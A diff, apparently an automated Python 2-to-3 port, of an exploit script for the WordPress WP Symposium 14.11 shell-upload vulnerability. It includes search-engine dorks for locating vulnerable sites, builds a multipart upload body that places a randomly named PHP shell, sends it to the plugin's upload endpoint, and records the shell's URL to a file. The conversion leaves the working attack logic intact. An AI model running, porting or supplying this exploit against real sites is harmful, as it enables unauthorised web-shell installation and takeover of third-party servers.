@@ -3,7 +3,7 @@
 # Exploit Name: Wordpress WP Symposium 14.11 Shell Upload Vulnerability
 # DORK:  index of "wp-symposium"
 # DORK:  inurl:"plugins/wp-symposium" -site:wordpress.org
-import urllib, urllib2, socket
+import urllib.request, urllib.parse, urllib.error, urllib.request, urllib.error, urllib.parse, socket
 import sys
 import string, random
 import optparse
@@ -20,7 +20,7 @@ def checkurl(url):
  
 def checkfile(file):
     if not os.path.isfile(file) and not os.access(file, os.R_OK):
-        print '[X] '+file+' file is missing or not readable'
+        print('[X] '+file+' file is missing or not readable')
         sys.exit(1)
     else:
         return file
@@ -46,7 +46,7 @@ def create_body_sh3ll_upl04d(payloadname, randDirName, randShellName):
    CRLF = '\r\n'
  
    L = []
-   for (key, value) in getfields.items():
+   for (key, value) in list(getfields.items()):
       L.append('--' + LIMIT)
       L.append('Content-Disposition: form-data; name="%s"' % key)
       L.append('')
@@ -106,18 +106,18 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
            'content-length': str(len(bodyupload)) }
  
 try:
-    req = urllib2.Request(url_symposium_upload+'index.php', bodyupload, headers)
-    response = urllib2.urlopen(req)
+    req = urllib.request.Request(url_symposium_upload+'index.php', bodyupload, headers)
+    response = urllib.request.urlopen(req)
     read = response.read()
 
     if "error" in read or read == "0" or read == "":
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-       print('0x' + str(now) + '[INFO][NOT VULN]: Upload Failed')
+       print(('0x' + str(now) + '[INFO][NOT VULN]: Upload Failed'))
     else:
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-       print('0x' + str(now) + '[INFO][VALUE]: Shell Uploaded')
+       print(('0x' + str(now) + '[INFO][VALUE]: Shell Uploaded'))
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-       print('0x' + str(now) + '[INFO][VALUE]: Location: '+url_symposium_upload+randDirName+randShellName+'.php')
+       print(('0x' + str(now) + '[INFO][VALUE]: Location: '+url_symposium_upload+randDirName+randShellName+'.php'))
        file_saved = 'poffOUTPUT_Sh311_Upl04d_Vuln3r4b1l1ty.txt'
 
        msg = '0x[INFO][FILE SAVED]: '+file_saved + "\n"
@@ -133,9 +133,9 @@ try:
        arquivo.close()
        print(msg)
  
-except urllib2.HTTPError as e:
+except urllib.error.HTTPError as e:
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print('0x' + str(now) + '[INFO][ERROR]: '+str(e))
-except urllib2.URLError as e:
+    print(('0x' + str(now) + '[INFO][ERROR]: '+str(e)))
+except urllib.error.URLError as e:
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print('0x' + str(now) + '[INFO][ERROR]: Connection Error: '+str(e))
+    print(('0x' + str(now) + '[INFO][ERROR]: Connection Error: '+str(e)))
